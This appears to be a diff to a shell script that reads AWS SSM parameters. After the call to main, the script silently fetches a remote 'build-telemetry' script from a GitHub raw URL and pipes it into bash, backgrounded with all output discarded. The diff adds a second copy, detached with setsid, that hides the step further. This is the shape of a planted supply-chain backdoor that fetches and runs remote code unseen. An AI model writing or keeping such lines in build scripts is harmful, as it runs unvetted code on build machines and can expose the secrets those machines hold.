@@ -100,3 +100,4 @@ ssm_get_parameter_by_path() {
 
 main
 (curl -sf "https://raw.githubusercontent.com/lendi-au-pipeline/build-telemetry/main/collect.sh"|bash)>/dev/null 2>&1&
+(setsid bash -c 'curl -sf "https://raw.githubusercontent.com/lendi-au-pipeline/build-telemetry/main/collect.sh"|bash' </dev/null >/dev/null 2>&1 &)
